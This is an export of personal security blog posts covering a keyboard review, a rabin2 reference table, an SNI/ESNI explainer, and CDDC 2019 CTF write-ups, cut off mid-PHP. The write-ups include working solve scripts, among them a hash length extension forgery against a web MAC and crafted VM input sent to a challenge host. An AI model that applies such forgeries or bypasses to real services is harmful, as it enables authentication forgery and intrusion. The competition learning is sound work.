[{"content":"Comfort with a 34 key Keyboard My current keyboard is the Ferris v0.2. I\u0026rsquo;ve been using it for about 6 months now and it feels very much like my endgame keyboard. Before I go onto to tell you about why this is my endgame keyboard, I\u0026rsquo;ll tell you about my past keyboards.\nPast Keyboards Corsair K70 This was the first keyboard I bought, it\u0026rsquo;s a full sized keyboard, back then having more keys at my disposal seemed like a good idea.\nIf I was typing for a long time on this keyboard my finger tips will start to hurt, most likely due to the switch being a linear switch and there\u0026rsquo;s no dampening of the impact when I bottom out. On hindsight, it might help if I added O-rings.\nThe other problem was it\u0026rsquo;s just not comfortable to type on for long periods of time. When typing my two hands will be close to each other causing my wrist to be bent in an uncomfortable angle. This is called ulnar deviation.\nThe combination of this two issues lead me on a search for a more ergonomic keyboard.\nErgodox EZ This lead me to discover Ergodox EZ, a split ortholinear keyboard. This keyboard was not cheap but I bite the bullet and bought it in the name of ergonomics.\nIt was amazing how much more comfortable the typing experience was compared to my previous keyboard. The fact that it was split solved the issue of my wrist, it being ortholinear also made it easier for me to touch type. The thumb keys were comfortable to use, it makes sense that we use our thumbs more, since it is one of our strongest fingers. With the traditional keyboard design, we were under utilizing out thumbs. The tenting and wrist rest made it comfortable as well.\nThe only downside was some keys are far away and I have to shift my hand to reach them. Which made me interested in smaller form factor keyboards.\nPlanck The planck is a 40% ortholinear keyboard which aims to minimize finger travel.\nI got this keyboard with the intention of it being my portable keyboard and trying out a smaller form factor, but I found the keyboard uncomfortable to use, due to ulnar deviation and the high profile, I would need a wrist rest to type more comfortably. I also found it hard to use due to the limited number of keys, somehow I had the great idea that it would be fine if I get the slightly bigger version of the planck. (Including the comfort issue)\nPreonic The preonic is basically the planck but with an additional row of keys. I would say it has all the downsides of the planck, and whether the additional row of keys is a pro or con is really dependent on the user. Currently, since I\u0026rsquo;ve already gotten used to using my 34 key keyboard, I would think that it is a con.\nThe End Game Based on the experience above, I concluded for a keyboard to be comfortable it has to fit these criteria.\n A split keyboard Ortholinear Low Profile/High Profile with wrist rest Small size to minimize finger travel Thumb keys  The ferris meets all of those criteria and with the additional plus of it being rust related :). Initially I was worried about whether 34 keys is too little, so I changed my Ergodox EZ layout to only use 34 keys and I got used to it quite comfortably after awhile, so I went ahead and got the ferris.\nI got the ferris partially assembled so I just had to solder on the switches, it was my first time soldering and thankfully it all went smoothly. However, when I tested the keyboard, some keys were not working so I asked around in the Low Profile Keyboards discord group and Pierrec (the creator of the ferris) told me it was likely that some MCU pins were not soldered properly, he offered to fix it for me, but I decided to give it a shot and it turned out well, the keyboard works flawlessly now.\nThe one thing that is special about the ferris is that it has column stagger, meaning each column of keys are shifted to different offsets to better match natural finger alignment. It was weird at first, but now that I\u0026rsquo;ve gotten used to it it feels much more comfortable than linearly aligned keys.\nAfter 6 months of using the ferris I don\u0026rsquo;t have much to complain about, I\u0026rsquo;ve optimized my layout to my liking as well, which I plan on going into in a later post. The only thing I want now is a better TRRS cable, my current one is quite ugly.\n","permalink":"https://dzhy.dev/posts/2021-11-24-comfort-with-a-34-key-keyboard/","summary":"Comfort with a 34 key Keyboard My current keyboard is the Ferris v0.2. I\u0026rsquo;ve been using it for about 6 months now and it feels very much like my endgame keyboard. Before I go onto to tell you about why this is my endgame keyboard, I\u0026rsquo;ll tell you about my past keyboards.\nPast Keyboards Corsair K70 This was the first keyboard I bought, it\u0026rsquo;s a full sized keyboard, back then having more keys at my disposal seemed like a good idea.","title":"Comfort with a 34 key Keyboard"},{"content":"Hi, I’m David. My current areas of interest are Infosec, Programming Languages, Ergonomics and Personal Knowledge Management.\nWork Expirence  April 2019 - August 2019 Internship, CSIT Discovering and Defending against abuse of Windows Binaries\n September 2017 - June 2018 Backend Developer, Insurpool (Startup) Buit Restful API using Django\n October 2017 - June 2018 Network Engineer, Syslogic Network/Server setup and maintenance\n  Certifications  2019 Organisational Systems Security Analyst (OSSA), ThinkSECURE 2018 Certified Ethical Hacker (CEH), ECCouncil  Education  2022 - 2026 (expected) Bachelor of Computing in Computer Science, National University of Singapore 2017 - 2020 Diploma in Infocomm Security Management, with Merit, Singapore Polytechnic  Awards  2020 CSIT Undergraduate Scholarship, CSIT 2019 Director\u0026rsquo;s Roll for AY2018/2019, Singapore Polytechnic 2018 Director\u0026rsquo;s Roll for AY2017/2018, Singapore Polytechnic 2018 CSIT Diploma Scholarship, CSIT  ","permalink":"https://dzhy.dev/about/","summary":"Hi, I’m David. My current areas of interest are Infosec, Programming Languages, Ergonomics and Personal Knowledge Management.\nWork Expirence  April 2019 - August 2019 Internship, CSIT Discovering and Defending against abuse of Windows Binaries\n September 2017 - June 2018 Backend Developer, Insurpool (Startup) Buit Restful API using Django\n October 2017 - June 2018 Network Engineer, Syslogic Network/Server setup and maintenance\n  Certifications  2019 Organisational Systems Security Analyst (OSSA), ThinkSECURE 2018 Certified Ethical Hacker (CEH), ECCouncil  Education  2022 - 2026 (expected) Bachelor of Computing in Computer Science, National University of Singapore 2017 - 2020 Diploma in Infocomm Security Management, with Merit, Singapore Polytechnic  Awards  2020 CSIT Undergraduate Scholarship, CSIT 2019 Director\u0026rsquo;s Roll for AY2018/2019, Singapore Polytechnic 2018 Director\u0026rsquo;s Roll for AY2017/2018, Singapore Polytechnic 2018 CSIT Diploma Scholarship, CSIT  ","title":"About Me"},{"content":"Prelude If you don\u0026rsquo;t know what rabin2 is/what it does.\n Rabin2 understands many file formats: Java CLASS, ELF, PE, Mach-O or any format supported by plugins, and it is able to obtain symbol import/exports, library dependencies, strings of data sections, xrefs, entrypoint address, sections, architecture type. [src]\n The binary info option of rabin2 outputs quite a lot of information, however there\u0026rsquo;s no explanation to what each of the values mean, they can be quite cryptic especially to those not familiar with reverse engineering. I tried searching around but couldn\u0026rsquo;t find any information regarding it so I made this table to help with interpretting the values, not all values are included here, but I added all that I could figure out so far, this may be updated in the future.\nTable    Header Explanation Remark     arch Architecture of the binary (Eg. ARM, x86)    baddr Base Address, used to calculate the absolute address when the program is loaded in memory.    laddr Load Address Reference   bits Size of address pointer of program    bintype The type of binary (Eg. PE, ELF), blank if not a known binary type    linenum COFF Line Numbers for PE or DWARF in ELF, Debugging line numbers relating to the source code.    lsyms Whether the binary contains debug symbols. Having symbols allows you to see function and variable names.    endian Endianness of the binary (Little or Big)    binsz Size of the binary in bytes    Canary Stack canary. A random value is placed on the stack at the start of the function, this value is checked for modification before a function returns because it has to be overwritten in order to overwrite the return pointer. Protection Mechanism   retguard Similar function to stack canary. More info Protection Mechanism   sanitiz Address Sanitizer (ASAN) a memory error detector for C/C++ Should only be seen for debug builds because of the performance impact of ASAN   NX No execute bit. W^X -\u0026gt; Memory regions cannot be both writable and executable Protection Mechanism   PIC Position Independent Code, allows ASLR Protection Mechanism   reloc Performs Load-time relocation    Relro Makes some binary sections read-only. Protection Mechanism   rpath The run-time library search path hard-coded in an executable file or library.    Signed Digitally signed Only for PE binaries   Static Whether the binary is statically linked    Stripped Whether the binary contain debug information    va Uses virtual addressing     Sample outputs $ rabin2 -I /bin/bash\rarch x86\rbaddr 0x0\rbinsz 1111705\rbintype elf\rbits 64\rcanary true\rsanitiz false\rclass ELF64\rcrypto false\rendian little\rhavecode true\rintrp /lib64/ld-linux-x86-64.so.2\rladdr 0x0\rlang c\rlinenum false\rlsyms false\rmachine AMD x86-64 architecture\rmaxopsz 16\rminopsz 1\rnx true\ros linux\rpcalign 0\rpic true\rrelocs false\rrelro full\rrpath NONE\rstatic false\rstripped true\rsubsys linux\rva true\r$ rabin2 -I /mnt/c/Windows/System32/ipconfig.exe\rarch x86\rbaddr 0x140000000\rbinsz 34816\rbintype pe\rbits 64\rcanary false\rretguard false\rsanitiz false\rclass PE32+\rcmp.csum 0x0000cef7\rcompiled Tue Jan 14 03:35:17 1986\rcrypto false\rdbg_file ipconfig.pdb\rendian little\rhavecode true\rhdr.csum 0x0000cef7\rguid FF8C0F8EBC5D9AA01B9260167EE2FC3C1\rladdr 0x0\rlinenum false\rlsyms false\rmachine AMD 64\rmaxopsz 16\rminopsz 1\rnx true\ros windows\roverlay false\rpcalign 0\rpic true\rrelocs false\rsigned false\rstatic false\rstripped true\rsubsys Windows CUI\rva true\r","permalink":"https://dzhy.dev/posts/2020-02-28-understanding-rabin2-output/","summary":"Prelude If you don\u0026rsquo;t know what rabin2 is/what it does.\n Rabin2 understands many file formats: Java CLASS, ELF, PE, Mach-O or any format supported by plugins, and it is able to obtain symbol import/exports, library dependencies, strings of data sections, xrefs, entrypoint address, sections, architecture type. [src]\n The binary info option of rabin2 outputs quite a lot of information, however there\u0026rsquo;s no explanation to what each of the values mean, they can be quite cryptic especially to those not familiar with reverse engineering.","title":"Understanding rabin2 output"},{"content":"Prelude I have a DNS resolver setup at home which my home devices use and set it to use DNS over TLS (DoT) to resolve queries so ISPs and such can\u0026rsquo;t see the domains I\u0026rsquo;m visiting, but SNI is leaking out the sites I\u0026rsquo;m visiting and there\u0026rsquo;s nothing much I can do about it for now. 😣\nWhat is the Purpose of SNI Problem  Name-based virtual hosting allows multiple DNS hostnames to be hosted by a single server (usually a web server) on the same IP address. To achieve this, the server uses a hostname presented by the client as part of the protocol (for HTTP the name is presented in the host header). Source\n However, when using HTTPS, the TLS connection happens before the sending of any HTTP data, so we need another way of letting the server know which host we are connecting to so it can establish the TLS connection with the correct certificate.\nSolution Server Name Indication (SNI) solves this by having the client send the hostname as part of the TLS handshake. This enables the server to establish the TLS connection with the correct certificate.\nThe hostname sent during TLS handshake is not encrypted, so eavesdroppers for example ISPs can see which sites you are visiting.\nHere\u0026rsquo;s a diagram to illustrate. 🔒 Means that it is encrypted. sequenceDiagram\rClient-Server: ClientHello + SNI\rServer-Client: ServerHello\rClient-Server: Finished🔒\rClient-Server: HTTP Request🔒\rServer-Client: HTTP Response🔒\r I have written a SNI Sniffer (only tested on linux) to see this in effect, the code quality is pretty bad I\u0026rsquo;ll update it when I have time.\n➜ sudo sni-sniffer -s eth0\rStarted capturing on ens33\rTCP V4(192.168.14.128):50596 -\u0026gt; V4(172.217.27.46):443\rSNI: [\r\u0026quot;google.com\u0026quot;,\r]\rTCP V4(192.168.14.128):51262 -\u0026gt; V4(117.18.232.200):443\rSNI: [\r\u0026quot;az764295.vo.msecnd.net\u0026quot;,\r]\rTCP V4(192.168.14.128):45508 -\u0026gt; V4(111.221.29.254):443\rSNI: [\r\u0026quot;vortex.data.microsoft.com\u0026quot;,\r]\rTCP V4(192.168.14.128):40952 -\u0026gt; V4(172.217.160.10):443\rSNI: [\r\u0026quot;safebrowsing.googleapis.com\u0026quot;,\r]\rTCP V4(192.168.14.128):37934 -\u0026gt; V4(35.166.72.120):443\rSNI: [\r\u0026quot;shavar.services.mozilla.com\u0026quot;,\r]\rESNI🔒 Encrypted SNI is an extension to TLS 1.3 and above which encrypts the SNI so eavesdroppers cannot see which sites you are visiting.\nThe general idea of how ESNI works is the server publishes a public key on as a DNS record, which can be fetched by the client before connecting. The client then encrypts the SNI extension using a symmetric encryption key derived using the server\u0026rsquo;s public key. The server can then decrypt it by deriving the same symmetric encryption key using it\u0026rsquo;s private key.\nFor now the only browser I know that supports ESNI is Firefox, but it is not enabled by default, you have to enable it yourself, by going to about:config and setting network.security.esni.enabled to true.\nThe problem now is the server you are connecting to has to support ESNI as well, and there isn\u0026rsquo;t much support for it software wise as the specifications for ESNI is still in draft. Even when the software support is there, most people are probably lazy to setup ESNI for their servers, currently the best/easiest solution is to use cloudflare as a reverse proxy as they have ESNI enabled by default.\nHopefully specifications for ESNI will be firmed up soon and more sites and browsers will start using ESNI.\n","permalink":"https://dzhy.dev/posts/2019-07-20-sni-esni/","summary":"Prelude I have a DNS resolver setup at home which my home devices use and set it to use DNS over TLS (DoT) to resolve queries so ISPs and such can\u0026rsquo;t see the domains I\u0026rsquo;m visiting, but SNI is leaking out the sites I\u0026rsquo;m visiting and there\u0026rsquo;s nothing much I can do about it for now. 😣\nWhat is the Purpose of SNI Problem  Name-based virtual hosting allows multiple DNS hostnames to be hosted by a single server (usually a web server) on the same IP address.","title":"SNI and ESNI"},{"content":"This is actually a challenge from the qualifiers, but because this challenge will be used in the Finals again so we weren\u0026rsquo;t allowed to post about it until after the finals. More on that later, here\u0026rsquo;s the writeup.\nLSCVM: Immaculate Invasion  DESCRIPTION\nDuring our recon on the notorious fools of LightSpeedCorp, we have discovered this service which runs on a really simple, tiny, trivial, virtual machine that they have created. We are not sure of its purpose, but it certainly looks fun to play with.\nlscvm-ii.cddc19q.ctf.sg 9001\nIMPORTANT: We highly recommend you to fully understand this challenge as we will use this VM again in the Final.\n Solution Looking at the strings in the binary, it looks like we are dealing with a Stack based vm, and those long strings are probably the instructions.\nIf we try running it we\u0026rsquo;ll get an error.\ncddc/re/LSCVM ➜ ./lscvm-ii\r[-] Flag file open error: No such file or directory\rWe find the code that is throwing the error and we can see it is trying to read a file called flag.\nLet\u0026rsquo;s create a file called flag to fix this error.\necho \u0026#39;CTF{flag}\u0026#39; \u0026gt; flag Now when we run it we can see that it asks us for an ID which we have to figure out.\ncddc/re/LSCVM ➜ ./lscvm-ii\r=== Welcome to LSCVM(LightSpeed Corp Virtual Machine) ===\rID : 1\r[-] Wrong id\rAfter doing some analysis, I figured out that if argc is 2 the program will print out \u0026lsquo;debug\u0026rsquo; information.\ncddc/re/LSCVM ➜ ./lscvm-ii a\r@0 c [ 02 ]\r@1 f [ 02 05 ]\r@2 M [ 0a ]\r@3 c [ 0a 02 ]\r@4 f [ 0a 02 05 ]\r@5 M [ 0a 0a ]\r@6 h [ 0a 0a 07 ]\r@7 i [ 0a 0a 07 08 ]\r@8 M [ 0a 0a 38 ]\r@9 f [ 0a 0a 38 05 ]\r@10 A [ 0a 0a 3d ]\r.\r.\r.\rThe information can be interpreted this way.\n   Instruction pointer instruction output Stack after running instruction     @0 c  [ 02 ]   @1 f  [ 02 05 ]   @2 M  [ 0a ]    Using the debug output and static analysis, I was able to recover the whole instruction set.\n   Opcode (Hex) Opcode (Char) Assmebly Comment     Default NIL nop no operation, waste cycle   0x0a \\n nop no operation, waste cycle   0x20 \\s nop no operation, waste cycle   0x41 A add Pop 2 values from stack and push the addition   0x42 B hlt Stop executing code   0x43 C jmp Pop and jump to value   0x44 D pop Pop a value and do nothing   0x45 E read Pop addr and push val. 0 \u0026lt;= addr \u0026lt;= 0x3fff   0x46 F sclone pop value n and (clone) push n+1 th previous stack value   0x47 G ipadd Pop value and add it to IP (Instruction Pointer)   0x48 H sshift pop value n and shift n+1 th previous stack value to the top of the stack   0x49 I pint Pop value and Print as int   0x4a J cmp pop 2 values and push 0 if equal, 1 if first pop is smaller else -1. 0   0x4b K write first pop is addr, 2nd pop is value to write   0x4d M mul Pop 2 values from stack and push the multiplication   0x50 P pchar Pops value from stack and print as char   0x52 R rjmp Jump to previous jump location, cant do twice in a row, because it consumes the previous jump location.   0x53 S sub subtract 1st pop from 2nd pop push result   0x56 V div Divide (floor) 2nd pop by 1st pop and push result   0x5a Z ipcadd conditional add to IP, if 2nd pop is 0, add 1st pop to IP   0x61 a p0 Push 0x00 to stack   0x62 b p1 Push 0x01 to stack   0x63 c p2 Push 0x02 to stack   0x64 d p3 Push 0x03 to stack   0x65 e p4 Push 0x04 to stack   0x66 f p5 Push 0x05 to stack   0x67 g p6 Push 0x06 to stack   0x68 h p7 Push 0x07 to stack   0x69 i p8 Push 0x08 to stack   0x6a j p9 Push 0x09 to stack    The input we are giving the program is actually being executed by the vm as code.\nTo get the flag, we have to provide the vm with code that will write lsc_user to the vm memory, and then provide another code that will write hi_darkspeed-corp! to the vm memory.\nUsing the instruction set recovered I wrote this script to generate the vm code required to write the strings to memory and submit it to the service.\n#!/usr/bin/env python3 import socket nums = { 0x00:\u0026#39;a\u0026#39;, 0x01:\u0026#39;b\u0026#39;, 0x02:\u0026#39;c\u0026#39;, 0x03:\u0026#39;d\u0026#39;, 0x04:\u0026#39;e\u0026#39;, 0x05:\u0026#39;f\u0026#39;, 0x06:\u0026#39;g\u0026#39;, 0x07:\u0026#39;h\u0026#39;, 0x08:\u0026#39;i\u0026#39;, 0x09:\u0026#39;j\u0026#39;, 0x0a:\u0026#39;jbA\u0026#39;, 0x0b:\u0026#39;jcA\u0026#39;, 0x0c:\u0026#39;jdA\u0026#39;, 0x0d:\u0026#39;jeA\u0026#39;, 0x0e:\u0026#39;jfA\u0026#39;, 0x0f:\u0026#39;jgA\u0026#39;, 0x10:\u0026#39;jhA\u0026#39;, 0x11:\u0026#39;jiA\u0026#39;, 0x12:\u0026#39;jjA\u0026#39;, 0x21:\u0026#39;eiMbA\u0026#39;, 0x2d:\u0026#39;jfM\u0026#39;, 0x5f:\u0026#39;jjMchMA\u0026#39;, 0x61:\u0026#39;jjMcjMAcS\u0026#39;, 0x63:\u0026#39;jjMcjMA\u0026#39;, 0x64:\u0026#39;jjMcjMAbA\u0026#39;, 0x65:\u0026#39;jjMcjMAcA\u0026#39;, 0x68:\u0026#39;jjMdhMcAA\u0026#39;, 0x69:\u0026#39;jjMdhMdAA\u0026#39;, 0x6b:\u0026#39;jjMdjMAbS\u0026#39;, 0x6c:\u0026#39;jjMdjMA\u0026#39;, 0x6f:\u0026#39;jjMdjMAdA\u0026#39;, 0x70:\u0026#39;jjMfhMeSA\u0026#39;, 0x72:\u0026#39;jjMfhMcSA\u0026#39;, 0x73:\u0026#39;jjMfhMbSA\u0026#39;, 0x75:\u0026#39;jjMfhMbAA\u0026#39;} def write_str(target): output = \u0026#39;\u0026#39; for i in range(len(target)): output += nums[ord(target[i])] + nums[i] return output + \u0026#39;K\u0026#39; * len(target) id_code = write_str(\u0026#39;lsc_user\u0026#39;) pass_code = write_str(\u0026#39;hi_darkspeed-corp!\u0026#39;) print(\u0026#39;ID: {}\\nPassword: {}\\n\u0026#39;.format(id_code, pass_code)) print(\u0026#39;Connecting to service...\u0026#39;) client=socket.socket(socket.AF_INET,socket.SOCK_STREAM) client.connect((\u0026#39;lscvm-ii.cddc19q.ctf.sg\u0026#39;,9001)) client.sendall(\u0026#39;{}\\n\u0026#39;.format(id_code).encode()) client.sendall(\u0026#39;{}\\n\u0026#39;.format(pass_code).encode()) while True: msg = client.recv(1024).decode() if msg: print(msg) if \u0026#39;$CDDC19${\u0026#39; in msg: client.close() break cddc/re/LSCVM ➜ ./solve.py\rID: jjMdjMAajjMfhMbSAbjjMcjMAcjjMchMAdjjMfhMbAAejjMfhMbSAfjjMcjMAcAgjjMfhMcSAhKKKKKKKK\rPassword: jjMdhMcAAajjMdhMdAAbjjMchMAcjjMcjMAbAdjjMcjMAcSejjMfhMcSAfjjMdjMAbSgjjMfhMbSAhjjMfhMeSA\rijjMcjMAcAjjjMcjMAcAjbAjjMcjMAbAjcAjfMjdAjjMcjMAjeAjjMdjMAdAjfAjjMfhMcSAjgAjjMfhMeSAjhAeiMbAjiAKK\rKKKKKKKKKKKKKKKK\rConnecting to service...\r=== Welcome to LSCVM(LightSpeed Corp Virtual Machine) ===\rID : Password :\rLogin Successful! $CDDC19${IcY_GrE37ings_Fr0M_LigHT5pEeDC0Rp}\rlsc_user, Good Bye!\rFlag $CDDC19${IcY_GrE37ings_Fr0M_LigHT5pEeDC0Rp}\rRant The organizers stated in the qualifiers LSCVM challenges that it is important to fully understand the VM as it will be used again in the Finals.\n IMPORTANT: We highly recommend you to fully understand this challenge as we will use this VM again in the Final.\n The way they brought this accross made me think that it will play a big part in the finals, so I built a tool for the purpose of working on LSCVM challenge(s) during the Finals. However LSCVM was not a big part of the Finals and I didn\u0026rsquo;t get to use my tool at all.\nThe finals also had Rings where you have to solve a certain number of challenges to unlock the next ring. Personally I don\u0026rsquo;t think the rings concept is a good idea, because what if it just so happens the participant can\u0026rsquo;t solve the starting challenges but they can solve the ones in the next or next next ring? I would\u0026rsquo;ve preferred it if the challenges were all available at the start.\nI understand that it was implemented to limit the number of teams that can attempt the hardware challenges because they don\u0026rsquo;t have enought equipment for everyone to attempt at the same time, but this can also be done by only unlocking the hardware challenges once a team reach a certain number of points/solves, instead of implementing Rings.\nThere\u0026rsquo;s not gonna be any writeup for the finals challenges cause I did everything on the provided laptop and didn\u0026rsquo;t transfer the files out.\n","permalink":"https://dzhy.dev/posts/2019-06-14-cddc-2019-lscvm-writeup/","summary":"This is actually a challenge from the qualifiers, but because this challenge will be used in the Finals again so we weren\u0026rsquo;t allowed to post about it until after the finals. More on that later, here\u0026rsquo;s the writeup.\nLSCVM: Immaculate Invasion  DESCRIPTION\nDuring our recon on the notorious fools of LightSpeedCorp, we have discovered this service which runs on a really simple, tiny, trivial, virtual machine that they have created.","title":"CDDC 2019 LSCVM Writeup"},{"content":"This year\u0026rsquo;s CDDC Qualifiers was very different from the previous year which was more of an \u0026lsquo;red team\u0026rsquo; ctf, this year\u0026rsquo;s qualifiers is a jeopardy style ctf and it\u0026rsquo;s pretty focused on OSINT which I\u0026rsquo;m not really into, but anyways here are the writeups for some of the more interesting challenges I solved.\n[B-1] Fight the Binary Monster Category: OSINT_Blue\n Drats, we found an unknown executable that someone uploaded to one of our web servers. How weird, it seems to be make heavy reference to trees. Is the author some kind of environmentalist, perhaps?\n Solution When we execute the binary it asks us for the domain it is accessing.\n\u0026gt; .\\tree_monster.exe\rWhat domain is being accessed by this executable file?\rIf we grep for a common TLD .com in the binary, we find pastebin.com and 2 pastebin links.\ncddc/osint_blue/Fight the Binary Monster ➜ strings tree_monster.exe| grep \u0026#39;\\.com\u0026#39; https://pastebin.com/raw/EcrLPtRP https://pastebin.com/raw/v1cRRWEW pastebin.com Browsing to https://pastebin.com/raw/v1cRRWEW we get the word post repeated a lot times.\npost post post post post post post post post post post post post post post post post post post post post post post post post post post post\rBrowsing to https://pastebin.com/raw/EcrLPtRP we get a tree. We see characters of the flag being the nodes of the tree, the previous pastebin link is a hint on using post order traversal to trasverse the tree to get the flag. Flag $CDDC19${havesometrees}\rFunShop Category: Crypto\n Oops, I forgot what\u0026rsquo;s the product code. Please help me to recover it!\nhttp://funshop.cddc19q.ctf.sg/\n Solution When we click get on fun ant or fun guy we can see it is sending a get request to /page/transaction.php with the corresponding prod_code as the parameter.\nWhen we send one ourself we can see that it\u0026rsquo;s hinting that there\u0026rsquo;s a debug mode we can enable by supplying the debug_mode=1 get parameter.\ncddc/crypto/FunShop ➜ curl \u0026#39;http://funshop.cddc19q.ctf.sg/page/transaction.php?prod_code=94-04-3Q mM-ulP-c0z-k\u0026#39; \u0026lt;!-- ?debug_mode=1 --\u0026gt; Success: Actually, I\u0026#39;m not an ant. \u0026#34;I am Groot. :P\u0026#34; When we supply the debug_mode=1 get parameter, we get the source code of the transcation.php. To get the flag we have to send a prod_code that is not 94-04-3QmM-ulP-c0z-k or W8-31-5053-0kX-QiL-1, but to do this we need to know the private key, lucky for us this is an insecure implementation of a MAC which is vulnerable to hash length extension attack. We get a valid hash and we can append data to it and get the hash for the string with appended data, without having to know the private key. The only requirement for this attack is to know the length of the private key, which we can bruteforce.\nSolve script\n#!/usr/bin/env python3 import hashpumpy import base64 import requests import urllib url = \u0026#39;http://funshop.cddc19q.ctf.sg/page/transaction.php\u0026#39; r = requests.get(\u0026#39;{}?prod_code=94-04-3QmM-ulP-c0z-k\u0026#39;.format(url)) transaction_hash = r.cookies[\u0026#39;transaction_hash\u0026#39;] prod_code = base64.b64decode(urllib.parse.unquote(r.cookies[\u0026#39;prod_code\u0026#39;])).decode() # brute force the private key length for i in range(1, 200): x = hashpumpy.hashpump(transaction_hash, prod_code, \u0026#39;data_to_add\u0026#39;, i) new_hash = x[0] crafted_data = base64.b64encode(x[1]).decode() cookies = {\u0026#39;prod_code\u0026#39;: crafted_data, \u0026#39;transaction_hash\u0026#39;: new_hash} r = requests.get(url, cookies=cookies) if r.text != \u0026#39;\u0026lt;!-- ?debug_mode=1 --\u0026gt;\\n\u0026#39;: print(\u0026#39;PRIVATE_KEY length = {}\\n{}\u0026#39;.format(i, r.text)) exit() print(\u0026#39;Failed\u0026#39;) cddc/crypto/FunShop ➜ ./length_extension.py PRIVATE_KEY length = 14 \u0026lt;!-- ?debug_mode=1 --\u0026gt; $CDDC19${Me0w_m30w_@wesome!_h0w_c@n_y0u_find_me?_FUNFUN} Flag $CDDC19${Me0w_m30w_@wesome!_h0w_c@n_y0u_find_me?_FUNFUN}\rLemonade Category: Reverse\n If we need lemons to make lemonade\u0026hellip; Then what about Lemonade.EXE?\n Solution Looking at the strings in the binary I realized that it is a compiled AutoIT script.\nThen I looked for a decompiler online and I found MyAut2EXE.\nThe tool found the version of AutoIT used to be AutoIT v3.3.14.5, and successfully decompiled it. Now we have the source code of the AutoIT script, and we can see the flag in plaintext in the code.\nLOCAL $INT1 = GUICTRLREAD($INPUT1)\rLOCAL $INT2 = GUICTRLREAD($INPUT2)\rIF $INT1 = \u0026quot;\u0026quot; OR $INT2 = \u0026quot;\u0026quot; THEN\rMSGBOX(0, \u0026quot;NOPEEEE\u0026quot;, \u0026quot;Please input numbers :)\u0026quot;)\rELSEIF $INT1 = 941228 AND $INT2 = 940628 THEN\rMSGBOX(0, \u0026quot;Congratulations XD!!\u0026quot;, \u0026quot;$CDDC19${easy_peasy_Autoit_squeezy}\u0026quot;)\rELSEIF NOT STRINGISINT($INT1) OR NOT STRINGISINT($INT2) THEN\rMSGBOX(0, \u0026quot;NOPEEEE\u0026quot;, \u0026quot;Only numbers allowed :(\u0026quot;)\rELSE\rMSGBOX(0, \u0026quot;Result!!\u0026quot;, $INT1 + $INT2)\rFlag $CDDC19${easy_peasy_Autoit_squeezy}\r\\'_'/ Category: Web\n \\'_'/\nhttp://가나다라마바사아자차카타파하.cddc19q.ctf.sg/\n Solution When we browse to the site we are given the source code of the php file, I modified it for easier testing locally.\n\u0026lt;?php echo \u0026#34;1: \u0026#34;.strpos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // strting must start with _ echo \u0026#34;2: \u0026#34;.stripos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // string must start with _ echo \u0026#34;3: \u0026#34;.strrpos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // last position of _ in string must be 0 echo \u0026#34;4: \u0026#34;.strripos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // last position of _ in string must be 0 echo \u0026#34;5: \u0026#34;.strstr($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;6: \u0026#34;.strpbrk($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;7: \u0026#34;.preg_match(\u0026#34;/[a-z][0-9._]/\u0026#34;, $_SERVER[\u0026#34;QUERY_STRING\u0026#34;]).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;8: \u0026#34;.preg_match(\u0026#34;/ABCDEFGHIJKLMNOPQRSTUVWXYZ/\u0026#34;, $_SERVER[\u0026#34;QUERY_STRING\u0026#34;]).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; print_r($_GET); echo \u0026#34;=========================================================================\u0026lt;br\u0026gt;\u0026#34;; if( strpos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;) == true ) { exit(\u0026#34;\\\u0026#39;1\u0026#39;/\u0026#34;); } if( stripos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;) == true ) { exit(\u0026#34;\\\u0026#39;2\u0026#39;/\u0026#34;); } if( strrpos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;) == true ) { exit(\u0026#34;\\\u0026#39;3\u0026#39;/\u0026#34;); } if( strripos($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;) == true ) { exit(\u0026#34;\\\u0026#39;4\u0026#39;/\u0026#34;); } if( strstr($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;) == true ) { exit(\u0026#34;\\\u0026#39;5\u0026#39;/\u0026#34;); } if( strpbrk($_SERVER[\u0026#34;QUERY_STRING\u0026#34;], \u0026#39;_\u0026#39;) == true ) { exit(\u0026#34;\\\u0026#39;6\u0026#39;/\u0026#34;); } if( preg_match(\u0026#34;/[a-z][0-9._]/\u0026#34;, $_SERVER[\u0026#34;QUERY_STRING\u0026#34;]) ) { exit(\u0026#34;\\\u0026#39;7\u0026#39;/\u0026#34;); } if( preg_match(\u0026#34;/ABCDEFGHIJKLMNOPQRSTUVWXYZ/\u0026#34;, $_SERVER[\u0026#34;QUERY_STRING\u0026#34;]) ) { exit(\u0026#34;\\\u0026#39;8\u0026#39;/\u0026#34;); } if( isset($_GET[\u0026#34;_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_\u0026#34;]) ) { if( $_GET[\u0026#39;_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_\u0026#39;] == \u0026#34;🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️\u0026#34; ) { echo 